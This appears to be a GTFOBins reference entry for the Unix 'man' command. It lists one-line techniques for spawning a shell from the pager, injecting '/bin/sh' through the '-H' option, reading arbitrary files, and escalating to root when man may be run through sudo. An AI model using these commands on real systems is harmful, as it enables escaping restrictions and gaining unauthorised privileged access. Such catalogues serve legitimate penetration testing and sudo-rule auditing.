# GTFOBin: man

This invokes the default pager, which is likely to be  `less`, other functions may apply.

## Shell

It can be used to break out from restricted environments by spawning an interactive system shell.

```
man man
!/bin/sh
```

This only works for GNU `man` and requires GNU `troff` (`groff` to be installed).

```
man '-H/bin/sh #' man
```

## File read

It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.

```
man file_to_read
```

## Sudo

If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

```
sudo man man
!/bin/sh
```